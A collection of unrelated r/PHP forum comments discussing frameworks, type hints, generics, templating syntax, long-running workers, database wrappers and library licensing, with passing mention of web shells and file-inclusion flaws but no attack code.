There's lots of free stuff on laracasts. All the [introductory stuff](https://laracasts.com/series/laravel-5-from-scratch) is completely free. I cannot recommend it enough and concur with mace015, I'd also go with Laravel and move on Symfony or your own assembly of Symfony (and/or Laravel) packages. Depending on the project I mix everything, that's the beauty of it. For learning, though, I definately thing there's nothing as good as Laracasts.
Yes! Love laravel's scheduler but wasn't able to use it with a silex app. Very nice.
&gt; But all the time spent on generics could benefit far more people if applied on adding concurrency primitives or async IO. Would that really impact more people than generics? I mean, Java generics affect nearly 100% Java programs and I expect over time that would be the same for PHP if they are added. Near 100% is pretty tough to beat. This is actually the reason I made the post on Internals and highlighted Zeev's opinion here. 
What are the problems you're having that the video doesn't solve? Have you found the most common items in use, that you can cache? Are you already using APCu/memcached?
Something like `wget https://stat.ripe.net/data/geoloc/data.json?resource=8.8.8.8` ?
[removed]
this has been submitted a few times already.
I think you guys are talking about the same thing. He wants the same task to run "in parallel" as in 'first one is still going, here goes the second one' exactly as crontab would do. Where as PHP unless you're using `yield` or heaven forbids [pthreads](http://php.net/manual/en/book.pthreads.php), you're gonna end up with just a single execution while it waits for the prior executions to finish.
Could we maybe have a link to the previous one? That way someone could sign on and see all of the debuted libraries from the last one. Not a full history, just a single back link to the last thread.
Let's share some projects!! \o/ * PHP implementation of circuit breaker pattern - https://github.com/ejsmont-artur/php-circuit-breaker * PHP Regular expressions made easy - https://github.com/VerbalExpressions/PHPVerbalExpressions * create and manipulate HTML objects abstractions - https://github.com/Anahkiasen/html-object * PHP component to convert HTML into a plain text format - https://github.com/soundasleep/html2text * An open IDE for web and native mobile development, built on top of Atom - https://github.com/facebook/nuclide * NSFW: https://github.com/ircmaxell/PhpGenerics, http://ladyphp.honzanovak.com/, http://mammouth.wamalaka.com/ 
&gt; your algorithms don't have to care what the type is right now in PHP. I'm sorry, but this argument is just completely wrong. For example, it's not uncommon to have a Repository which handles data persistence for entities of a specific type. Sometimes that means working with collections. Also, can you state with confidence that your algorithms will function properly if you had requested a collection of Potatoes and one of the objects returned was a Spoon? Of course not - but then the question you should be asking is how exactly would we implement this type of behavior using PHP? Currently, the only way to do this is by creating a collection for each entity which is responsible for enforcing invariants. ---- ie: PotatoRepository::findAllExpiredPotatoes(): Potatoes class Potatoes extends Collection { /** * @params Potato[] $potatoes */ public function __construct(array $potatoes) { foreach($potatoes as $potato) { if(!$potato instanceof Kitchen\Domain\Entities\Potato) { throw new \InvalidArgumentException('Get out of my kitchen!'); } } //add potatoes to the container } Rinse, repeat for each and every Entity. 
God. Php is such a joke these days
Thanks. I'm excited to hear what are your thoughts on the concept explained in the Wiki: https://github.com/atk4/data/wiki. I'll finish it by end of the week and will need more people to give me opinion on that. p.s. tried to add it to "the code repo" but didn't work.
I'm not sure why queries go on the bus, I'm used to thinking of them as asymmetrical compared to commands, possibly involving per-node caches, specialized read-models, etc. Having one handler-class per command seems like a lot of writing, especially if lots of related commands all follow similar steps (and injected dependencies.) At work I have a design where handlers follow a naming convention so any method like `handleFoo(FooSomething $command)` is assumed to be the sole handler for the hinted command-class. This way I can set up just one `FooHandler` with a `FooRepository` and keep most foo-manipulation in one place. 
When I read the title I thought "A competitor to phalcon, that could be interesting"... Oh well..
does it help generate md or html files from phpDoc?
That depends on whether functionality is different for web vs API. For instance, if I hit `/planets` on my browser, I should see some HTML with a list of planets. Maybe with some buttons to add new planets, or a link to edit planets or what-have-you. If I hit `/planets` on an API, I expect a JSON response that contains a list of planets. In this case, the only thing that changed was the view (HTML vs JSON), and so no, you wouldn't need separate controllers. Just return different views, depending on the request type. On the other hand, if you're returning things like user information and profile photos and have a lot of web-centric integrations (file uploads, and so on), and the API fetches a different set of data and performs different actions, then separate controllers would be nice. That's my two cents. Hope that helps. Good luck.
Thanks for the insight, including crons in the provisioning set up make sense. I'm not so sure about "We all know PHP is not ideal for long running processes" though: could you expand? I've seen a lot of people saying that (e.g. "PHP is designed for shared-nothing architecture", "most libraries are designed for shared-nothing architecture"), but without any data to back it up. On the contrary, I see a lot of long process projects going on (e.g. servers with ReactPHP, Icicle, Aerys, etc) and it turns out most libraries do provide the possibility to clean up memory ([there's even a library listing those clean ups](https://github.com/LongRunning/LongRunning/))
I agree. But now a days i am busy with another open source project. Once that project is complete, i will move it to OAuth.
I have put together initial repo with detailed docs, examples, goals and roadmap. Could you please take a look? https://github.com/atk4/data (use Gitter to discuss further)
You are looking for ajax. If you are already using jquery it might be easier for you to start using that first. http://api.jquery.com/jquery.ajax/
I have put together initial repo with detailed docs, examples, goals and roadmap. Could you please take a look? https://github.com/atk4/data (use Gitter to discuss further)
not exactly how it works, you'll need to name your HTML file as "index.php" then do: &lt;html&gt; &lt;body&gt; &lt;?php include 'php/test.php' ?&gt; &lt;/body&gt; 
Nicolay, I have put together initial repo with detailed docs, examples, goals and roadmap. Could you please take a look? https://github.com/atk4/data (use Gitter to discuss further)
That's a much bigger question than I can answer here. Tell you what: email me directly (let me know if you can't find the address) and we can talk that way.
I just released this project today. Please, let me know what you think. I will be more than happy if you comment with an idea how the site could be improved, or if you notice a functionality that is missing. Also, feel welcome to contribute if you know a valuable library that isn't on the list. Thanks!
By the way if you have any nginx configuration tips, feel free to share!
What if I need my php script to draw info from a mysql database? Does ajax fit the bill still?
Ah, this is what I want to avoid. I don't like mixing different languages in a single file...is there a way around this?
If I follow this, would my php script work with the &lt;script&gt; tag? Or would I still have to embed php in the html file?
So is it fundamentally "dangerous" to write code in Ruby? Elixir? Smalltalk? Python? Javascript? What is the worst thing that can happen in a library I write if someone passes me an incompatible parameter? My library breaks in that person's codebase? Just like it would break if they passed an incompatible parameter and I *did* use a type hint? I agree that it's true for all type information, I think all of it is a waste in PHP, especially since it's only enforced at run time, and it's not even properly "enforced" . For example, I can type hint an interface and still call methods on that object that aren't defined in the interface. Embracing a duck typed approach to programming doesn't mean anyone is "out of touch with reality". EDIT: Also, re: "just write perfect code lol!", are you saying that using type hints, you can somehow get away with writing incorrect code? Is writing code that works properly unattainable without somehow using type annotations to magically fix your mistakes or something? I thought all they did was check the type of a parameter when it was passed to a function, I didn't realize they could automatically fix incorrect code.
I use symfony/process for parallel job execution and it's great.
This is a really great point that I think a lot of people not involved with larger projects are going to miss out on, although I think the term "shared-nothing" is probably being used in two different ways here (yours being the more common use in the context of PHP) We can already leverage the benefits of PHP for parallel requests with what's there *if your application is architected correctly* - that is to say, we have or can easily use message queues, curl, and sockets to run tasks in parallel. And more importantly, we've broken them down into smaller, specialized services that aren't part of a huge monolith (now we can easily rewrite them without breaking everything else, even using a different language if appropriate). And what do you know, [code exists](https://github.com/phacility/libphutil) to do this [pretty easily](https://secure.phabricator.com/book/libphutil/article/using_futures/). And there are no shortage of other approaches one can take (these are basically just wrappers for multi-curl and proc_open, after all). Just please don't `fork()` from your originating HTTP request or you're probably going to have a bad time. To be fair, having this natively supported rather than relying on a third-party library would be ideal, but that's hardly a deal-breaker.
I get where you're coming from, but having used both, I disagree. Discounting the fact that docblocks aren't an official standard (and even the community one isn't finalized yet), just consider what the syntax means more generally: $type[] Looks like an append operation, vs [$type] which looks like a create operation. Also on a more practical note, I find the "enclosed" version more expressive since it easily allows more type information: `var foo = [Int: [[MyClass]]]()` is perfectly valid Swift (probably `[int =&gt; [[MyClass]]] $foo = []` in PHP), but I don't believe there's a good way to represent that with the postfix syntax. Having said that, something is better than nothing and I'll use whatever we get.
I don't know if it should, if you say it shouldn't then I believe you :-) i am having issues to find a library to generate md files for my phpDoc and though maybe yours could solve it.
how about a `producer update` command? when executed - updates year in license. - updates generated phpDoc - updates `CHANGES` file by reading all commits that start with [Enh], [Bug], [BC], [Fix] and add them. - compiles binaries - Shows you the diff and allows you to configure a commit. - if commit cancelled the changes are kept but not committed. This allow you to edit something before commit manually or execute `producer release` - if commit is approved it allows you to choose if tag as release.
This goes all in the html file right? Is there a way to do this but without having php code in html? Can I do something like: &lt;?php include script.php ?&gt;
&gt; adds absolutely nothing to the language Yes, PHP 7 really offers nothing over 5. Aside from the performance gains. And the memory management improvements. And improved type safety. And anonymous classes. And a more logical, uniform syntax. And zero cost OO assertions. And...
what would the code look like?
That's what I meant by this: &gt; It would mean that static analysis of code could be done without comments I guess It is definitely a good benefit, and relying less on comments to dictate types would be good, but even then; that would only benefit a portion of the community. The reason it works so well for compiled languages is because it works for everyone.
since the html file is already outputting the opening html and body tags, the included PHP script can just be PHP code &lt;?php // the file is included by index.html echo 'IT WORKS'; ?&gt; 
Sure. thats what include does.. &lt;body&gt; &lt;?php include('somehugescript.php'); ?&gt; &lt;/body&gt;
Nope, I meant the small syntactic sugars. I know there is a HUGE leap from 3 -&gt; 4.2 (to be exact) and from 5.6 -&gt; 7. I am just talking about the small useless patches after 7.0 
ok sweet! just wanted to make sure. I'll try it out!
PHP is a templating language. It is meant to do that.
There is no way to get more parallelism than there are cores available. There have to be architectural changes to further improve concurrency or stop doing so much setup/teardown.
So, that sounds more like style one, just with a templating engine.
~~Mouse-over on hearts and stars don't work on the main page, but work when viewing by category.~~ Nevermind - worked on reload. Curious.
When you use a reverse proxy and load balancing you can't really say that the application itself is the one which grants you the speed.
Or with alternate php syntax: &lt;?php if($this): ?&gt; &lt;div&gt;that&lt;/div&gt; &lt;?php endif ?&gt; You should never really be echoing html unless it's in some kind of decorator class.
I'm not part of any open source projects that belong to FIG, but I like this idea.
Echoing out HTML everywhere is going to get very messy very fast. PHP in HTML, using the short open tag &lt;? things are pretty neat. Twig is great, but may very well be overkill if you're not building an application with more than a few pages. 
I think that it depends on the file. Mostly html with one echo? &lt;div&gt; &lt;?=$somethingThatIsnNotNull?&gt; &lt;/div&gt; (short tags in the template always! http://php.net/ini.core#ini.short-open-tag) If it's a view helper class that is mostly php, then echo away!
PSR's are the closest things to standards PHP has at the moment. And they're pretty close
i had the same though when i read the scalar object article the first time: "why don't we have that in the PHP RFC ?". Would be awesome
If the server isn't configured to handle short tag, your code fails miserably.
I would assert that, yes, it's indeed fundamentally *more* dangerous to use a dynamically or duck typed language than a statically typed one; or, more accurately, that to get the same level of safety requires a lot of additional boilerplate code. It's also more dangerous to run your application as root, or using a language that requires the programmer to manage their own memory, or any other number of things. Types don't solve all errors, and to imply that I was suggesting that is disingenuous at best, but mostly seems to just intentionally miss the point. To reiterate my own words, they eliminate an entire *class* of errors. The danger isn't so much in what happens when you call a missing method on an object of the wrong type (crash, most likely) but what happens when you call a method *that does exist* on an object of the wrong type. To use a contrived example, call `delete` on an object that represents a collection of rows in a database (or, hell, a whole table) rather than an individual record. That's going to run just fine, and now you've lost data. Using duck typing doesn't make anyone out of touch with reality. Making statements about "code that doesn't contain type mistakes" and "If you were passing the right types before" does, because you just can't know that to be true. Code has bugs. What's true today probably won't be true tomorrow.
No worries! Yeah by all means learn it for yourself first, but don't be afraid of loading up Composer and brining the odd little thing in like a template language, an auth library, Carbon, etc; any of that remedial stuff where you're only going to be re-inventing the wheel. It feels like cheating but I promise it's not. Yeah definitely keep clear of &lt;? on anything where you're not in full control of the environment. There's a php.ini config line that dictates whether short tags are allowed. 
Thanks for highlighting that. It certainly does; and if you're not doing things properly could expose things like DB credentials. It's neat, but use with caution. 
The "if" is implied, the "?" is the "then" and ":" is the else. Ternary syntax is generally discouraged as a bad coding practice though.
You mean all the bug fix releases? Yeah, those were pretty useless. Who the hell needs bug fixes?
While &lt;? ?&gt; tags are deprecated in most versions and removed in PHP 5.6(?), &lt;?= "something" ?&gt; is not only valid in all modern versions but encouraged over &lt;?php echo "something"; ?&gt;, this includes PHP 7, not just the 5.x line. Edit: Below comment is correct, these are not depreciated/removed (I was confusing it with [this](https://wiki.php.net/rfc/remove_alternative_php_tags)), just [discouraged](http://php.net/manual/en/language.basic-syntax.phptags.php). 
haha as another non vim user, I liked how you typed vom sort of like how vim users vomit folding code and thrust it on everyone else's face here is our favorite inciter talking about the issue of code folding http://blog.codinghorror.com/the-problem-with-code-folding/ i think uncle bob would also not favor code folding... i'm not quoting him but just feel like that's what he'd say however in any case, i think consistency trumps all https://www.emacswiki.org/emacs/TabsSpacesBoth 
I wouldn't say it's bad practice, it just that it's not a replacement for a regular if statement and it has fewer use cases than a regular if statement. For simple expressions I think it can help readability but anything more complex and you should stay well away from it.
Did Propel2 ever implement Data Mapper as described in this blog post? http://propelorm.org/blog/2015/06/27/propel2-current-state-and-future.html Can't really find anything useful in their docs.
Given the title I didn't expect an illuminate/support dependency. 
So, why would it be encouraged over `&lt;?php`? Also, it was `&lt;?` that broke some code, not `&lt;?=`, so that makes sense.
Thanks for the heads up!
In templates, short php tags in an html document (which is likely a php file itself). In controllers, it should be all php code, echoing anything you need to echo (which should be never).
Glad I dont work with you.
Mostly because it's cleaner looking, &lt;?= $variable ?&gt; is very close to what templating languages syntax typically looks like, ie {{ $variable }} and while templating languages do a bit more behind the scenes (sanitize the output for one) this is as close as you can get to that with raw PHP. It's basically the same reason that the alternative if/endif/while/etc syntax is recommended in template files instead of the standard C style syntax.
Makes sense! I try to use the alternative syntax as much as possible, but I do find bracket highlighting very useful and easier to read.
Laravel will run multiple overlapping instances by default, if they take too long to run. You can specify with an option that they don't run in parallel, and each job will create a system lock file that prevents any other instances *of the same job* running again until the first is finished. However, I'm not sure if the jobs it runs each minute are in parallel or serial.
This has been going on for years. Microsoft published regarding C99 [in 2011](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Backdoor%3aPHP%2fC99shell.H) and I recall at the time I had already seen it heaps.
It's nice to share different tools and frameworks sometimes. Maybe new subscribers to /r/php haven't heard of it yet. Phalcon is certainly not as popular as Symfony or Laravel. Maybe /u/speckz found it really interesting, and wanted to share it!
The current setup also makes it impossible to overload the type hints in CommandHandlers. PHP will allow me to pass *any* Command implementation to a Handler, even if it's the completely wrong command with no related data. Personally, I've been enjoying using [Ross Tuck's Tactician](http://tactician.thephpleague.com/). It allows you to specify your own handler structure.
twig is unnecessary, it's just another layer of complexity. Stick with native PHP and you'll be fine.
Its not a PHP Specific website. Also, super easy to add frameworks http://php.libhunt.com/categories/402-api/new_project
ESIs? 
The title is "super speed Symfony"...
=? I don't understand that syntax. :Collection&lt;T&gt; is return a Collection of T, but loadBlogPosts&lt;T is blogpost&gt;() WTF!!!??
There's two articles from /u/sergiokas on the matter: * [PHP Is Meant to Die](https://software-gunslinger.tumblr.com/post/47131406821/php-is-meant-to-die) * [PHP Is Meant to Die, Continued](https://software-gunslinger.tumblr.com/post/48215406921/php-is-meant-to-die-continued) Now, PHP have changed a lot since 2013 (when the articles were written), and there are certainly things that makes it run better. And yes, we as an industry are smarter now, and not try to parallelize in the same process, but instead use message queues with many smaller single purpose workers doing one job at a time. However, quirky gotchas still crop up more often than we'd like. For example, we have a long running single purpose worker that gets jobs from a message queue. Straight forward, easy, but we've found that in our use case, even after `unset()` everything, a particularly well liked open source library (I believe it was Guzzle 5.x, but I cannot remember which one off hand anymore) doesn't release a few kilobytes per request. So we'd need to restart the worker after a few thousand jobs or it will die from running out of memory. Not the end of the world, but when we need to work with hundreds of thousands of requests in a short period, it was clear that it wasn't really ideal. Don't get me wrong, even with the added overhead of having to manage the workers, we still save ridiculous amount of time from not having to setup/tear down PHP between requests... so in our case, you can bet we doubled down and invested dev effort on the worker management aspects. But, if we cannot start a job and end the job completely cleanly so there's no residual left between jobs, then we cannot use it safely for a long running process.
Gut reaction: This is kind of problem where everybody thinks they all agree on the "obvious" way, and then they compare notes and realize that they are all thinking of things which are incompatible in small but very fundamental ways. (So *unlike* PSR-7, which is rooted in HTTP and *decades* of people experimenting with managing it through servlet-style interfaces.) So, sure, let's look it... but the path to a good-standard requires hammering out some extremely specific goals and use-cases for what this particular *kind* of event system will (and won't!) handle.
Thats ok. Its how to get super speed with Symfony. Not how to make Symfony super speedy.
Then surely it's more accurate to just call it "Super Speed Site", since if you're using reverse proxies and load balancers, Symfony really has nothing to do with it?
You can still enable short tags in 5.6 (...but you should feel bad about it. 0.o ) I think that option was only removed in 7.
Whenever a thread gets blocked the core can be allocated to work on something else. And resume later when it gets unblocked. 
Means that `T` (generic type) must be a subtype of `BlogPost`
What's still missing so there is no difference at all between PHP and lol.. Java?
It reduces risk of deployments by removing the need to interact with the crontab directly.
That's better concurrency, not parallelism.
From a commercial software developer perspective, it is bad because you severely restrict your customer base (clients won't be able to use your software on shared hosting providers if it requires special PECL install step). From a consumer perspective, it makes running the software more expensive (cannot just throw on a shared provider, but instead need a VPS or Dedi). From a server admin perspective, it is one more thing I'd have to update semi-regularly to prevent security problem. Sure, with Docker and proper CI, it might not be as bad, but that's still headache I don't want to have to deal with. So, in general, I just steer away from things like that to keep the headaches away.
&gt; SURELY I don't have to argue that 5 / 1.16 should not be silently converted to 5 / 1 and give you 5 as an answer.... I fail to see why the modulus operator should be any different. I know this is old, but I just wanted you to see this Python 2.7.10 (default, Oct 14 2015, 16:09:02) [GCC 5.2.1 20151010] on linux2 In[2]: 10 / 3 Out[2]: 3 
Join the two tables in one SELECT query? Quick, like this. SELECT * FROM job, worker WHERE job.idWorker = worker.id; or a bit more proper, like this. SELECT j.*, w.* FROM jobb AS j INNER JOIN worker AS w ON j.idWorker = w.id; Now var_dump($res) and see what you find.
This is a great project. Are the projects automatically synced with https://github.com/ziadoz/awesome-php ? Also it would be great to have an atom/rss feed for each category.
hmm, but it's safe to do that in order to get country name. As it is the most trusted website also .
nginx serving static files can definitely keep up, but in terms of actual caching Varnish is still miles ahead. Poul-Henning Kamp, the original creator, was a kernel developer before and went to the nth-limit optimising the slabs Varnish uses. It's just amazing what it can take. You'll saturate the pipe (or hit the artificial throttles if you're on a cloud provider) before Varnish starts to creak. And I recently started using the Lua module in nginx after having used OpenResty before. It can do a lot of awesome things that before I either did in VCL with C modules or had to pass through to the next layer in the stack.
I do not like parameters at all. The parameters should be relative to the event itself, not an interface, they are instead properties. Sub-classing is the way to go, not array key/values. Generic events could be implemented to support key/value parameters, but that is no business of interfaces to decide. Also, what fundamentals are used with events? I believe in my experience the only common thing is propagation control. I for one think it would be great if the event dispatcher is injected into the event for a more concrete and logical access. This interface works best in relation to Symfony event dispatcher, but they assume you know that the listener has additional parameters, though the event itself should contain the information.
I don't get it. You have a conversation, he made a point and now you put his opinion to the pillory? What do you want to achieve with this post? Guys did you notice what's the subject of this conversation at all? OP just picked out a minor related side statement for a public blame. Stop giving this troll attention.
I guess OP run out of rebuttal that makes sense the only thing left for him was to public-shame. That's what you do to get what you want regardless of the facts. 
 &gt;So, sure, let's look it... but the path to a good-standard requires hammering out some extremely specific goals and use-cases for what this particular *kind* of event system will (and won't!) handle. Use cases that come to mind: 1. Login/logout - creating/clearing sessions, updating db records (eg date_modified) 1. DB queries - transform/sanitize results, JIT data transforms (eg INSERT, UPDATE) 1. Asynchronous Ops - non-blocking sockets, threading, external cURL requests 1. Error Handling - Listen for exceptions from anywhere, similar to try/catch, but more asynchronous in a sense
It is interesting how this question is ever green and always draws much attention and voting. 
The PHP version is online since yesterday ;)
If I have to, I prefer to use the alternative syntax for control structures &lt;?php if ($this): ?&gt; &lt;div class="foo"&gt;That&lt;/div&gt; &lt;?php endif; ?&gt;
FYI your GitHub login is broken. It redirected me to a 404 page on libhunt.
Sure, go for it, it might just as well give you the results you need. The problem is that Symfony can be complex, and then complex things "don't click in your brain" everything with it starts to look like bullshit leading to people who just rant how stupid this or that is. Symfony framework is just a glue for components, so it you will start getting how the components work it won't be a problem understanding how all of them come together to provide a full framework. Well either way I wish you luck with learning it.
Nowere it's a matter of style. You have to always keep in mind that real templates are slightly different from silly on-liner examples.
OMG who said you that &lt;? ?&gt; are deprecated? Who are all these people who voted up this nonsense? 
I exclusively use the first approach. When I am writing my views with PHP, I try to relegate it to how I might use a templating language in another language. That means (to me) using it for control structures (conditionals), for loops and echoing PHP variables into my template.
I would never breakup an if stmt like your first example. The code is overly confusing. Option 2 &amp; 3 are preferred. I normally use Option 2 when I have alot of variable to insert, so I don't have to use the "." to concatenate them: echo "&lt;div&gt;$var1&lt;/div&gt; &lt;div&gt;$var2&lt;/div&gt; &lt;div&gt;$var3&lt;/div&gt;";
I go with this one too, then use short echo tags inside the block to echo out any vars: &lt;?php if ($this): ?&gt; &lt;div class="foo"&gt;&lt;?=$that;?&gt;&lt;/div&gt; &lt;?php endif; ?&gt; Personally I find it easiest to read and manage, and with this sort of method (including OP's option 1, and twig etc.) most IDE's will highlight the HTML syntax inside the block as HTML rather than a string, which IMO is a lot easier to code with.
&gt; does a fine job of it How do you rationalize the popularity of php templating languages such as twig?
Adopting a solution where no problem exists
I'm curious. How long have you been in the business?
thanks for pointing , will look to further improve it.. :)
Any plugin that is vulnerable to file inclusion attacks. https://en.wikipedia.org/wiki/File_inclusion_vulnerability
It depends on how you are doing things. Are you separating your templates from your content generation? Do you have separate generators for things like tables and forms? 
The word "can" is not something that a programmer can rely on. In fact, for a PHP user, *any* circumstance may lead to a "longer query time". A letter case for example. Or a PHP syntax used to run a query. Just because an average PHP user is unable to make a proper connection between the cause and the consequence. So I tend to discard such "cans" as indemonstrable rumors.
By very much this title saying "Zeev Suraski thinks…" OP gets personal. Please read at least the starting of the original discussion to get an understanding what OP's intention might be.
Then why put 'can' in your title?
He's right... I mean why have typed Arrays... Array&lt;T&gt; just makes too much sense. We need to create a new collection object every time we want a typed array. 
Your $options array in the constructor has no use either, you create it without using it. A suggestion would be to merge the $driver_options array with that one, using the internal one as a default.
Well, you failed with your attempt. This kind of answer cannot be helpful at all. And just a query *size* is scarcely a reason, if you think of it. Complexity - may be. But what kind of complexity?
2 days if you come to the CakePHP workshops this year :) http://cakefest.org/ Take a serious look at CakePHP 3 though (Basic tutorials here: http://book.cakephp.org/3.0/en/tutorials-and-examples.html). I think that CakePHP has one of the best documentation of all the frameworks, it is incredibly powerful, and quite performant in the recent incarnations. CakePHP also has a big advantage of being very well supported, with releases receiving bug fixes and security fixes for a very long time. Plus, we've got a very active and helpful community (Join our slack channel: http://cakesf.herokuapp.com/)
You forgot Cake3 ORM, the new state of the art ORM people should be considering ;) No active record pattern or any other of those things the other ORMs usually ship with.
Sweet. Thanks!
I am shopping for a good wrapper. My code is clean and easy even with complex stuff, but it use a collection of wrappers that I made. I don't want a wrapper that would result on more verbose code, and I don't need a wrapper that seems to be trying to replace SQL ( I already have ActiveRecord-like objects for that ). Maybe I should directly use PDO, but is more verbose than the stuff I already have. I will probably end having to write my own class wrapper, since seems that I am the only one that want his code to be so simple a 5 years old can read and understand it :P 
I would say 3.0 :)
You're a nice dude 
Use the MVC structure! https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller
You are right.
What do you want to do with said wrapper, exactly? I've been using [Aura.Sql](https://github.com/auraphp/Aura.Sql) with a small (~150 lines) abstract repository class and it's worked well for several small projects where a full ORM would be overkill.
Well you don't need any file in your repo to have all commits ran through scrutinizer or sensiolabs' insight...
Most PHP applications will use a templating library like Twig, Blade, etc to generate and output the HTML response. All fo them will be some mix of HTML+templating syntax.
I don't use the regular short tags (`&lt;?`) but IIRC short echo tags are supported everywhere by default, so this line: &lt;?= 'Hello World!' ?&gt; Is equivalent to this one: &lt;?php echo 'Hello World!' ?&gt;
It really depends on your needs. If you are happy with raw SQL and basic placeholder types that PDO offers, then you need only a little helper function to run a prepared query in a single call and returning a statement. If you need more some helpers, then you need a wrapper, but it have to be closely inspected regarding security, as wrappers tend to make huge breaches in security, just like one discussed here. If you are looking for a query builder, I'd say it a completely different thing, that should be based on a wrapper but cannot be called a wrapper itself. Same goes for an ORM. So, what are your needs?
Ug programmer, this technical space, Ug no have time for nicety. Ug attack people who try to help him because their help no live up to Ug's high standards.
Hi stanislavb.. it seems your signup is broken (using github)..
You could use [Behat](http://docs.behat.org/en/v3.0/).
I think it's a good consensus to add them in the interface. sometimes pragmatism trumps theory. 
Hm. It wasn't working about 6 hours ago; however, I fixed it. It seems to be working at the moment. It would be great if you direct-message me some details. Thanks!
Maybe I'm crazy, but isn't this entire article a bunch of shit? They're not using a web shell to attack sites, they're using it to control already compromised sites... Next at 11: Hackers use Firefox to attack WordPress!
&gt; 55% have a LICENSE file, that's.. pretty disastrous I'm not sure if it is or not. I know these are used in the US, but are license files even legally binding/helpful in the rest of the world? I've been wondering this for years. For instance, the Microsoft software licenses that say 'no resale' were overturned by the European court. You can sell you Windows 10 license when you buy a new computer for instance.
This isn't public shaming any more than sharing the opinion of any other publicly made statement, such as a political figure or major OSS contributor like Linus Torvalds. Additionally, in the link I shared I made no statements; I only linked Zeev's words. You can also look up my history - there is zero evidence of trolling. *You* are the one making personal attacks, not me.
Great! An event handler can alter the event completely. So you can start with a `login` event on a `User` and end up with a `payment_successful` on a `CreditCard` :) 
 function addSomething(array | string $what) { foreach ((array) $what as $value) { $this-&gt;things[] = $value; } } That's one I see a lot - accept a single value, or an array of values. I don't see a huge use for `array | Traversable` since these can be two quite different things, and if the receiver function is going to teat it as an array, it may as well require an array, and the caller can convert it before passing it in using `iterator_to_array()`. If it's a massive iterator over a huge database result or an infinite one, well, it wouldn't work either way without some special handling. Though I do wish `toArray()` was defined in a default PHP interface and implemented by many internal classes. Right now I use `Countable` as a sort of halfway point to test if an iterator has a known length, since by definition infinity isn't countable, and neither is an unknown size, so I only ever convert `Traversable | Countable` to an array.
That's an insanely stupid idea. "Let's remove someone's ability to effectively disagree, because they often disagree". As much as I disagree with Zeev on some things, I value him greatly as a moderating influence on the project.
Uh oh, what a drama. Someones feelings are badly hurt. 
Yes, it's overflowing with sewage.
If your post isn't a personal attack, /u/malkusch's isn't a personal attack. He's simply posing a legitimate criticism of your tone/approach here. There've been several reports of this post from people voicing the same concern - that this is promoting dogpiling behaviours. I think we should avoid calling people out directly like this, unless we think their behaviour is aggressively bad. It doesn't add anything to the conversation, and it creates a sort of antagonism. Challenge ideas, not people.
[I can beat this one easily](https://phpdelusions.net/pdo/pdo_wrapper). Only one wrapper method call instead of three: $res = DB::run("SELECT id FROM foo WHERE price &gt; ?", [$foo] ); foreach ($res as $row) //something here } binding is done using standard PDO binding. run() is a simple wrapper thet returns a PDO statement, which is enormously useful. You may check the examples page to see what I mean. 
This doesn't need to be a squabble. Both of you are posing legitimate concerns, just in a less-than-ideal way. Recognize the concern being posed and respond to it. Don't get hung up on the bad tone that you yourself might be guilty of too.
There might be a way to do it in a 2.1, and maintain backwards compatibility. See [the new changelog branch](https://github.com/producerphp/producer.producer/tree/changelog) and [today's commits](https://github.com/producerphp/producer.producer/commits/changelog). The only problem will be extracting the release-specific change notes in a backwards-compatible way.
yep, they do, each form has different fields and one is a date picker, which might complicate things. oh, sorry, should i delete this post and repost in /r/PHPhelp ?
ooh, mink looks nice, thanks!!
Ooh, yeah, that's clever. Thanks
You're mixing up EULAs (which are unenforceable in much of the world, as you say) with copyright licences — without the latter, you wouldn't be allowed to even copy (much less modify) a project, as it's automatically copyrighted in almost every country in the world. FOSS licences are simply a way for creators to say "as the copyright holder, I am granting you the right to copy and modify my work under these terms".
Your input type should be submit, not submitbutton: &lt;input type="submit"/&gt; https://www.w3.org/TR/html-markup/input.submit.html
After reading the README I have no idea what this package does.
I have to agree. Even when I was making a library to be shared between a Lumen and Laravel app, even the Application instances on each do not share a similar interface. There are great helpers and the Collection object is fantastic. But true, there is a lot of dependencies. If you're not in the Laravel ecosystem might want to double check on that.
Do you have last week's link?
Yep, i am using codacy for some of my projects. You configure everything on their website and they just pull the code (including PRs) and do all the stuff themselve.
Ease of use and setup are basically identical with most large hosts, setup will just take a bit longer with dedicated hardware (but still only minutes to hours versus seconds for a VPS). Price versus performance still really depends on your actual requirements, the scope of the project and the architecture of the application. 
&gt; Do whatever you want with it as long as you mention my name and don't sue me. FTFY
From one of the examples: @requires ($c &gt;= 0) @requires ($a &lt;= ($b+$c)) @requires ($b &lt;= ($a+$c)) @requires ($c &lt;= ($a+$b)) I view this as outright abuse of annotations/attributes. *this is programming logic, and it belongs in the normal flow of your program. End of.* I work on en enterprise Java app at work and it's *full* of shit like this. A 5 line function has literally 45 lines of annotations that describe how it should behave or what is/isn't a valid argument value, rather than just using normal code to do that. The above example, whether in the form of a language-level annotation, or a doc block annotation, is fundamentally problematic. Some of the execution of that function is being handled by a proxy/interceptor, and some of it is in the actual function. I couldn't think of a better way to make your code base more confusing or opaque. if ($c &lt; 0 || $a &gt; ($b + $c) || $b &gt; ($a + $c) || $c &gt; ($a + $b)) { throw new InvalidArgumentException; } That is 100% clear, and 100% unambiguous. There's no confusion as to what would happen if one of the argument requirements aren't met. You know where that validation is happening, and can trace the execution of code so much more easily. Java apps are a total pain in the asshole to debug and code trace because of all the god damn meta programming instead of NORMAL programming. If the attributes/annotations were limited to things like telling the compiler what to do, fine. But since people love doing weird shit with code (like validation-as-meta-programming above), then I would hate to see this RFC pass - it will most certainly be abused and make PHP applications and programs hard to reason about. It's hard to understand the horror this will unleash until you've worked on an enterprise Java app....
Even though this is known as the slippery slope fallacy I do agree in this case. I have seen the horrors done with annotations in Java and to some degree had to work with them. Wholly unpleasant. In fact, the only annotations I've seen that weren't completely horrible were `@Override` to ensure you are overriding a method (this isn't really that helpful, to be honest) and `@NotNull`, which issue we don't have in PHP since our explicit types are not inherently nullable.
What advantages does this have over WordPress or any other CMS? It seems to do the same thing j less I am missing something 
Another alternative is the [CakePHP/Collection](https://github.com/cakephp/collection) library.
What haven't "they" learned and who is "they"?
By "they" I mean Taylor Otwel and by "what" I mean that decoupled components do more good for the community as a whole than a monolithic package, since Laravel was greatly benefited by reusable components from other projects. 
For outside viewers, Symfony looks like a cohesive package. One doesn't need to know that everything is decoupled to use it. The only difference is that you can also use one or two of its packages separately if you want. The idea is not complicated, really: just make smaller separate packages (blade, eloquent etc) and a big one that binds and configures them and has all the smaller packages as it's dependencies (illuminate, in this case).
